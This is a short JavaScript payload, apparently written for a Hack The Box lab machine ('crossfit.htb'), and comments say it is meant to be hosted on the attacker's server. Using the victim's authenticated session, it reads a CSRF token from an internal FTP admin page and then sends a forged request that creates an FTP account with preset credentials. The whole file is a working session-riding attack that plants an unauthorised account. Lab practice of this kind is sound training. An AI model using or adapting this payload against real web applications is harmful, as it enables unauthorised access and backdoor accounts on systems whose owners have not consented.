// Host this file on your server on port 80
function GetCSRFToken(){
    var req = new XMLHttpRequest()
    var url = "http://ftp.crossfit.htb/accounts/create" //page you wanna read
    req.open('GET', url, false) // false: wait till the response is received
    req.withCredentials = true // to keep the session
    req.send()
    var response = req.responseText
    // parse the response to extract the CSRF token value
    parser = new DOMParser()
    var doc = parser.parseFromString(response, "text/html")
    var csrfToken = doc.getElementsByName('_token')[0].value // extract the CSRF token to send a valid request
    return csrfToken
}

function CreateFTPUser(){
    req = new XMLHttpRequest()
    url = "http://ftp.crossfit.htb/accounts"
    csrfToken = GetCSRFToken()
    var data = "username=johndoe&pass=password123&_token=" + csrfToken
    req.open('POST', url, true)
    req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
    req.withCredentials = true // to keep the session
    req.send(data)
    var response = req.responseText
    return response
}

CreateFTPUser()
